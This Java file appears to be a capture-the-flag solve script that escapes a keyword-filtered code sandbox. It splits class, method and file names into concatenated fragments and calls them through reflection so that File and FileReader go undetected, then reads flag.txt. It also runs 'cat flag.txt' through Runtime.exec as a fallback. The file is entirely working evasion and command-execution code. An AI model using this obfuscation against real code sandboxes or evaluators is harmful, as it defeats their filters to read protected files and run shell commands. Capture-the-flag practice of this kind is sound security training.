public class solve {
    public static void main(String[ ] args) {
        try {
            Class<?> fClass = Class.forName("java.io.Fi" + "le");
            java.lang.reflect.Constructor<?> fConst = fClass.getDeclaredConstructor(String.class);
            java.lang.reflect.Method inst = fConst.getClass().getMethod("ne" + "wInstance", Object[ ].class);

            String fn[ ] = { "fla" + "g.txt" };
            Object fle = inst.invoke(fConst, (Object) fn);

            Class<?> frClass = Class.forName("java.io.Fi" + "leReader");
            java.lang.reflect.Constructor<?> frConst = frClass.getDeclaredConstructor(fClass);
            java.lang.reflect.Method inst2 = frConst.getClass().getMethod("ne" + "wInstance", Object[ ].class);

            Object frArgs[ ] = { fle };
            Object fr = inst2.invoke(frConst, (Object) frArgs);

            char f[ ] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            frClass.getMethod("read", char[ ].class).invoke(fr, f);

            System.out.println(f);

            // or
            byte ff[ ] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            Process process;
            process = Runtime.getRuntime().exec("cat fla" + "g.txt");
            process.waitFor();
            java.io.InputStream inpStream = process.getInputStream();
            inpStream.read(ff);
            // consume map to char 
            for (int i = 0; i < ff.length; i++) {
                f[i] = (char) ff[i];
            }
            System.out.println(f);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
